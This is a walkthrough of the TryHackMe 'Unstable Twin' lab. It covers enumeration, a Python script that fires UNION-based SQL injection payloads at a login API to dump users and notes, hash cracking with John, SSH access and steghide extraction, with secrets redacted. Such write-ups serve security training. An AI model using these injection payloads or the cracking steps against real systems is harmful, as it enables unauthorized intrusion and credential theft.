# Unstable Twin 
TryHackMe | Unstable Twin -- Walkthrough

Link to the room: https://tryhackme.com/room/unstabletwin

## Lets go 

```
export IP=10.10.155.88
```

## Nmap

```
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.155.88 10.10.155.88
```

```
22/tcp open  ssh     OpenSSH 8.0
80/tcp open  http    nginx 1.14.1
```

## Gobuster

```
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -x php,html
```

```
/info                 (Status: 200) [Size: 160]
```

### Visiting the url $IP/info

```
"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"
```
This doesn't provide us with much information however is a nice segway to task 1.

Now that we have some information regarding it being a webserver, lets use a specific wordlist for web content and run a ffuf scan. 

```
ffuf -u 'http://10.10.196.10/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc all -fs 233
```

```
api                     [Status: 404, Size: 0, Words: 1, Lines: 1]
info                    [Status: 200, Size: 148, Words: 29, Lines: 2]
get_image               [Status: 500, Size: 291, Words: 38, Lines: 5]
```

## Task 1

Let's get more information about the API

```
curl -v http://$IP/info
```

```
> GET /info HTTP/1.1
> Host: 10.10.155.88
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Sat, 01 May 2021 02:52:34 GMT
< Content-Type: application/json
< Content-Length: 148
< Connection: keep-alive
< Build Number: 1.3.6-final
< Server Name: Julias
```
We did get some information; however, it's not for the server we're looking for. Let's rerun the command with a higher verbose level.

```
curl -vv http://$IP/info
```

```
> GET /info HTTP/1.1
> Host: 10.10.155.88
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Sat, 01 May 2021 02:54:58 GMT
< Content-Type: application/json
< Content-Length: 160
< Connection: keep-alive
< Build Number: *********
< Server Name: Vincent
```

Okay, weird, the server changed. This might be the misconfiguration regarding the deployment the room was talking about. 

## Task 3

For this task, conventional wisdom would dictate we fire up SQLMAP and enumerate the users; however, we know that several services are running at the moment, which might hamper our results. 

Let's run a final a ffuf scan on /api for good measure/

```
ffuf -u 'http://10.10.196.10/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc all -fs 233
```

```
login                   [Status: 405, Size: 178, Words: 20, Lines: 5]
```

Time to leverage the hidden API we came across, which would help authenticate users. A simple python script running SQLi code would do the trick.

```
import requests
url = ' http://10.10.155.88/api/login'
ii = [
 "1' UNION SELECT username ,password FROM users order by id-- -",
 "1' UNION SELECT 1,group_concat(password) FROM users order by id-- -",
 "1' UNION select 1,tbl_name from sqlite_master -- -",
 "1' UNION SELECT NULL, sqlite_version(); -- -",
 "1' Union SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'; -- -",
 "1' Union SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='notes'; -- -",
 "' UNION SELECT 1,notes FROM notes-- -"]
for i in ii:
    myobj = {'username': i,
             'password': '123456'}
    x = requests.post(url, data=myobj)
    print(x.text)
    myobj = {'username': i,
             'password': '123456'}
    x = requests.post(url, data=myobj)
    print(x.text)
```

```
[
  [
    "******", 
    "Red"
  ], 
  [
    "*****", 
    "Green"
  ], 
  [
    "******", 
    "Yellow "
  ], 
  [
    "********", 
    "continue..."
  ], 
  [
    "*******", 
    "Orange"
  ]
]

"The username or password passed are not correct."

[
  [
    1, 
    "Green,Orange,Red,Yellow ,continue..."
  ]
]

"The username or password passed are not correct."

[
  [
    1, 
    "notes"
  ], 
  [
    1, 
    "sqlite_sequence"
  ], 
  [
    1, 
    "users"
  ]
]

"The username or password passed are not correct."

[
  [
    null, 
    "3.26.0"
  ]
]

"The username or password passed are not correct."

[
  [
    null, 
    "CREATE TABLE \"users\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"username\"\tTEXT NOT NULL UNIQUE,\n\t\"password\"\tTEXT NOT NULL UNIQUE,\n\tPRIMARY KEY(\"id\" AUTOINCREMENT)\n)"
  ]
]

"The username or password passed are not correct."

[
  [
    null, 
    "CREATE TABLE \"notes\" (\n\t\"id\"\tINTEGER UNIQUE,\n\t\"user_id\"\tINTEGER,\n\t\"note_sql\"\tINTEGER,\n\t\"notes\"\tTEXT,\n\tPRIMARY KEY(\"id\")\n)"
  ]
]

"The username or password passed are not correct."

[
  [
    1, 
    "I have left my notes on the server.  They will me help get the family back together. "
  ], 
  [
    1, 
    "My Password is ***************************************************************************************************************************\n"
  ]
]

"The username or password passed are not correct."
```
Success! This info will help in the following two tasks.

## Task 5

### Hash-Identifier

```
Possible Hashs:
[+] SHA-512
[+] Whirlpool
```

### John the ripper

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha512 hash.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********       (?)
1g 0:00:00:00 DONE (2021-04-30 23:28) 10.00g/s 1884Kp/s 1884Kc/s 1884KC/s joan08..beckyg
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
We have successfully managed to crack it. One of the reasons for using john instead of hashcat is because I'm running a VM, and as john is cpu extensive, it's preferable to do so.

## Task 6

SSH into the machine using the credentials.

```
ssh mary_ann@$IP 
```

```
cat user.flag
```

## Task 7

```
cat server_notes.txt
```

```
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.
```

Let's retrieve the images for all the users using the list from the database and the API details from the server_notes. As you can see, the word GET and IMAGE are provided as hints!

### Retrieving the images

Use the following template to retrieve all the images of the family members:

```
curl -v http://$IP/get_image\?name\=[insert name] --output [name].jpg
```

Also, don't worry if you can't find certain images. Run each command twice to get the desired results (mainly because of the server misconfiguration).

### Steghide to extract embeded data

Use the following command for each of the images:

```
steghide extract -sf [name].jpg
```

Once you have extracted encoded messages, line them up in the colors of the rainbow (ROYG).

```
Red - *******************
Orange - ********************
Yellow - ********************
Green - ************************ 
```

```
***********************************************************************************
```

### Using icyberchef

Set the recipe to 'From Base62'

```
You have found the final flag THM{***************************}
```
